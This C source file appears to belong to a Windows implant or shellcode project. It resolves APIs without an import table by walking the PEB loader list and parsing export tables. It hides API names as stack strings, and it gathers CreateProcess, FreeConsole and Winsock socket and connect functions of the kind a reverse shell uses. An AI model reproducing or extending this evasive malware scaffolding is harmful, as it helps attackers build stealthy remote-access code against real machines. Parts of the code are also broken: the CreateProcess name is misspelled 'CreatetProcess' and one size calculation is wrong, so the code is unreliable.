
#include <windows.h>
#include <structs.h>
#include <common.h>
#include <core/win32.h>

PVOID LdrModuleAddr( _In_ LPWSTR ModuleName){

    PTEB                  pTeb  = __readgsqword(0x30);
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &pTeb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );
        if (wccmp(Data->BaseDllName.Buffer, ModuleName) == 0){
            return C_PTR(Data->DllBase);
        }
    }

    return NULL;
}

PVOID LdrFuncAddr( _In_ PVOID BaseModule, _In_ PCHAR FuncName){
    
    PIMAGE_NT_HEADERS       pImgNt           = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDir           = { 0 };
    DWORD                   ExpDirSz         = { 0 };
    PDWORD                  AddrOfFuncs      = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FuncAddr         = { 0 };

    pImgNt           = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew);
    ExpDir           = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirSz         = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( BaseModule + ExpDir->AddressOfNames );
    AddrOfFuncs      = C_PTR( BaseModule + ExpDir->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( BaseModule + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ){    
      if ( StringCompareA( (PCHAR)BaseModule + AddrOfNames[ i ], FuncName ) == 0 ) {
        return C_PTR( BaseModule + AddrOfFuncs[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}

void InitInstance( _Out_ PINSTANCE pInstance){

  /*--------------------------[ Kernel32 ]--------------------------*/

    WCHAR wKernel32[] = L"KERNEL32.DLL";

    CHAR  cLoadLibraryA[]           = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR  cWaitForSingleObject[]    = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR  cCreateProcess[]          = { 'C', 'r', 'e', 'a', 't', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    CHAR  cCloseHandle[]            = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR  cSleep[]                  = { 'S', 'l', 'e', 'e', 'p', 0 };
    CHAR  cFreeConsole[]            = { 'F', 'r', 'e', 'e', 'C', 'o', 'n', 's', 'o', 'l', 'e', 0 };
    CHAR  cExitProcess[]            = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };

    pInstance->Modules.Kernel32           = LdrModuleAddr(wKernel32);

    pInstance->Api.pLoadLibraryA          = LdrFuncAddr(pInstance->Modules.Kernel32, cLoadLibraryA);
    pInstance->Api.pSleep                 = LdrFuncAddr(pInstance->Modules.Kernel32, cSleep);
    pInstance->Api.pCloseHandle           = LdrFuncAddr(pInstance->Modules.Kernel32, cCloseHandle);
    pInstance->Api.pCreateProcess         = LdrFuncAddr(pInstance->Modules.Kernel32, cCreateProcess);
    pInstance->Api.pWaitForSingleObject   = LdrFuncAddr(pInstance->Modules.Kernel32, cWaitForSingleObject);
    pInstance->Api.pFreeConsole           = LdrFuncAddr(pInstance->Modules.Kernel32, cFreeConsole);
    pInstance->Api.pExitProcess           = LdrFuncAddr(pInstance->Modules.Kernel32, cExitProcess);

  /*--------------------------[ ws2 ]--------------------------*/
    
    CHAR cws2[]         = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 } ;

    CHAR cclosesocket[] = { 'c', 'l', 'o', 's', 'e', 's', 'o', 'c', 'k', 'e', 't', 0 };
    CHAR cWSASocket[]   = { 'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'A', 0 };
    CHAR cWSAConnect[]  = { 'W', 'S', 'A', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR cWSAStartup[]  = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0 };
    CHAR cWSACleanup[]  = { 'W', 'S', 'A', 'C', 'l', 'e', 'a', 'n', 'u', 'p', 0 };
    CHAR cRecv[]        = { 'r', 'e', 'c', 'v', 0 };
    CHAR cinet_addr[]   = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0 };
    CHAR chtons[]       = { 'h', 't', 'o', 'n', 's', 0 };

    pInstance->Modules.ws2      = pInstance->Api.pLoadLibraryA(cws2);

    pInstance->Api.pclosesocket = LdrFuncAddr(pInstance->Modules.ws2, cclosesocket);
    pInstance->Api.pWSASocket   = LdrFuncAddr(pInstance->Modules.ws2, cWSASocket);
    pInstance->Api.pWSAConnect  = LdrFuncAddr(pInstance->Modules.ws2, cWSAConnect);
    pInstance->Api.pWSAStartup  = LdrFuncAddr(pInstance->Modules.ws2, cWSAStartup);
    pInstance->Api.pWSACleanup  = LdrFuncAddr(pInstance->Modules.ws2, cWSACleanup);
    pInstance->Api.pRecv        = LdrFuncAddr(pInstance->Modules.ws2, cRecv);
    pInstance->Api.pinet_addr   = LdrFuncAddr(pInstance->Modules.ws2, cinet_addr);
    pInstance->Api.phtons       = LdrFuncAddr(pInstance->Modules.ws2, chtons);

}